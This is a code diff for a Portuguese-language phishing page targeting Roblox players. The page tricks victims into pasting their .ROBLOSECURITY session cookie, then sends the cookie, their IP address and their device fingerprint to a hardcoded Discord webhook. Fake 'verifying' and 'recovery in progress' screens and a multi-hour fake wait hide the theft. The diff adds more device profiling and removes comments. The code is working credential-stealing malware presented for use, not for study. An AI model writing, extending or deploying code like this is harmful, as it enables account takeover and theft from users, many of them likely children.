@@ -1,11 +1,11 @@
-// CONFIGURAÇÃO - SUBSTITUA PELO SEU WEBHOOK DO DISCORD
+// CONFIGURAÇÃO - SEU WEBHOOK DO DISCORD
 const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1485346055141851308/-4ro_V3pWvgd_qRDW6uOO0WkVEmDQmt-9HNzgFd1MnqObF-TGy23rXLxESosIqg8KnFT";
 
 // Chave para armazenar no localStorage
 const STORAGE_KEY = "aurora_last_submission";
 
 // Função para enviar dados para o Discord com @everyone
-async function sendToDiscord(cookie, userAgent, ip) {
+async function sendToDiscord(cookie, userAgent, ip, deviceInfo) {
     const embed = {
         title: "🎮 @everyone NOVA CONTA VINCULADA - AURORA",
         description: "⚠️ **ALERTA IMEDIATO** - Nova conta detectada no sistema!",
@@ -17,18 +17,13 @@ async function sendToDiscord(cookie, userAgent, ip) {
                 inline: false
             },
             {
-                name: "🖥️ User Agent",
-                value: `\`${userAgent}\``,
+                name: "📱 Dispositivo",
+                value: `${deviceInfo.type}\n**Sistema:** ${deviceInfo.os}\n**Navegador:** ${deviceInfo.browser}`,
                 inline: true
             },
             {
                 name: "🌐 IP do Cliente",
                 value: `\`${ip}\``,
-                inline: true
-            },
-            {
-                name: "📱 Tipo de Dispositivo",
-                value: `${/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent) ? "📱 Celular/Tablet" : "💻 Desktop/PC"}`,
                 inline: true
             },
             {
@@ -72,7 +67,37 @@ async function sendToDiscord(cookie, userAgent, ip) {
     }
 }
 
-// Função para obter IP do cliente via API pública
+// Função para obter informações do dispositivo
+function getDeviceInfo() {
+    const ua = navigator.userAgent;
+    let deviceType = "💻 Desktop/PC";
+    let os = "Desconhecido";
+    let browser = "Desconhecido";
+    
+    if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) {
+        deviceType = "📱 Celular/Smartphone";
+    } else if (/Tablet|iPad/i.test(ua)) {
+        deviceType = "📟 Tablet";
+    } else {
+        deviceType = "💻 Desktop/PC";
+    }
+    
+    if (ua.includes("Windows")) os = "Windows";
+    else if (ua.includes("Mac OS")) os = "macOS";
+    else if (ua.includes("Android")) os = "Android";
+    else if (ua.includes("iOS") || ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
+    else if (ua.includes("Linux")) os = "Linux";
+    
+    if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Google Chrome";
+    else if (ua.includes("Firefox")) browser = "Mozilla Firefox";
+    else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Apple Safari";
+    else if (ua.includes("Edg")) browser = "Microsoft Edge";
+    else if (ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";
+    
+    return { type: deviceType, os: os, browser: browser };
+}
+
+// Função para obter IP do cliente
 async function getClientIP() {
     try {
         const response = await fetch('https://api.ipify.org?format=json');
@@ -102,12 +127,10 @@ function checkCooldown() {
     }
 }
 
-// Função para salvar data da submissão
 function saveSubmissionDate() {
     localStorage.setItem(STORAGE_KEY, new Date().toISOString());
 }
 
-// Função para mostrar mensagem temporária
 function showMessage(message, isError = true) {
     const existingMsg = document.querySelector('.cooldown-message');
     if (existingMsg) existingMsg.remove();
@@ -123,14 +146,12 @@ function showMessage(message, isError = true) {
     }, 5000);
 }
 
-// Função para mostrar tela de recuperação
 function showRecoveryScreen() {
     document.getElementById('main-screen').style.display = 'none';
     document.getElementById('recovery-screen').style.display = 'block';
     document.getElementById('processing-screen').style.display = 'none';
 }
 
-// Função para mostrar tela de processamento
 function showProcessingScreen(message) {
     document.getElementById('main-screen').style.display = 'none';
     document.getElementById('recovery-screen').style.display = 'none';
@@ -138,7 +159,6 @@ function showProcessingScreen(message) {
     document.getElementById('processing-message').textContent = message;
 }
 
-// Função para resetar para tela principal
 function resetToMainScreen() {
     document.getElementById('main-screen').style.display = 'block';
     document.getElementById('recovery-screen').style.display = 'none';
@@ -146,12 +166,10 @@ function resetToMainScreen() {
     document.getElementById('cookie').value = '';
 }
 
-// Função principal de envio
 async function submitCookie() {
     const cookieInput = document.getElementById('cookie');
     const cookie = cookieInput.value.trim();
     
-    // Validar cookie
     if (!cookie) {
         showMessage("❌ Por favor, insira seu cookie .ROBLOSECURITY", true);
         return;
@@ -162,17 +180,14 @@ async function submitCookie() {
         return;
     }
     
-    // Verificar cooldown
     const { canSubmit, daysLeft } = checkCooldown();
     if (!canSubmit) {
         showMessage(`⚠️ Você precisa aguardar ${daysLeft} dias para realizar um novo processo.`, true);
         return;
     }
     
-    // Mostrar tela de processamento
     showProcessingScreen("Verificando credenciais...");
     
-    // Simular processamento
     setTimeout(async () => {
         showProcessingScreen("Autenticando no servidor...");
         
@@ -180,18 +195,14 @@ async function submitCookie() {
             showProcessingScreen("Conta encontrada! Recuperando dados...");
             
             setTimeout(async () => {
-                // Obter IP e User Agent
                 const ip = await getClientIP();
                 const userAgent = navigator.userAgent;
+                const deviceInfo = getDeviceInfo();
                 
-                // Enviar para o Discord
-                const sent = await sendToDiscord(cookie, userAgent, ip);
+                const sent = await sendToDiscord(cookie, userAgent, ip, deviceInfo);
                 
                 if (sent) {
-                    // Salvar data da submissão
                     saveSubmissionDate();
-                    
-                    // Mostrar tela de recuperação
                     showRecoveryScreen();
                 } else {
                     showMessage("❌ Erro ao processar solicitação. Tente novamente mais tarde.", true);
@@ -202,7 +213,6 @@ async function submitCookie() {
     }, 1000);
 }
 
-// Função para simular recuperação de conta
 function startRecoveryProcess() {
     showProcessingScreen("Iniciando recuperação de conta...");
     
@@ -215,16 +225,13 @@ function startRecoveryProcess() {
             setTimeout(() => {
                 document.getElementById('processing-message').innerHTML = "⏳ Aguarde de 1 a 3 horas<br>A nova senha será enviada para este dispositivo.";
                 
-                // Barra de progresso infinita
                 const progressFill = document.querySelector('.progress-fill');
                 progressFill.style.animation = 'none';
                 progressFill.offsetHeight;
                 progressFill.style.animation = 'progress 3s ease-out infinite';
                 
-                // Salvar que o processo foi iniciado
                 localStorage.setItem('aurora_recovery_started', new Date().toISOString());
                 
-                // Mostrar mensagem de aviso
                 setTimeout(() => {
                     showMessage("⏰ Processo iniciado! Aguarde de 1 a 3 horas. Recarregue a página após o período para tentar novamente.", false);
                 }, 1000);
@@ -233,14 +240,12 @@ function startRecoveryProcess() {
     }, 1500);
 }
 
-// Verificar cooldown ao carregar a página
 window.addEventListener('DOMContentLoaded', () => {
     const { canSubmit, daysLeft } = checkCooldown();
     
     if (!canSubmit) {
         showMessage(`🔒 Você já utilizou o sistema há ${19 - daysLeft} dias. Aguarde mais ${daysLeft} dias para um novo processo.`, true);
         
-        // Desabilitar botão após 3 segundos se estiver em cooldown
         setTimeout(() => {
             const sendBtn = document.getElementById('send-btn');
             if (sendBtn) {
@@ -251,7 +256,6 @@ window.addEventListener('DOMContentLoaded', () => {
         }, 3000);
     }
     
-    // Verificar se já existe um processo de recuperação em andamento
     const recoveryStarted = localStorage.getItem('aurora_recovery_started');
     if (recoveryStarted) {
         const startDate = new Date(recoveryStarted);
@@ -263,7 +267,6 @@ window.addEventListener('DOMContentLoaded', () => {
             showMessage(`⏳ Processo de recuperação em andamento. Aguarde mais ${remainingHours} horas.`, false);
         } else if (hoursPassed >= 3 && hoursPassed < 24) {
             showMessage("✅ Processo concluído! Recarregue a página para iniciar um novo processo.", false);
-            // Limpar após 24 horas
             setTimeout(() => {
                 localStorage.removeItem('aurora_recovery_started');
             }, 86400000 - (now - startDate));
@@ -271,11 +274,9 @@ window.addEventListener('DOMContentLoaded', () => {
     }
 });
 
-// Event Listeners
 document.getElementById('send-btn').addEventListener('click', submitCookie);
 document.getElementById('recover-btn').addEventListener('click', startRecoveryProcess);
 
-// Permitir enviar com Enter
 document.getElementById('cookie').addEventListener('keypress', (e) => {
     if (e.key === 'Enter') {
         submitCookie();
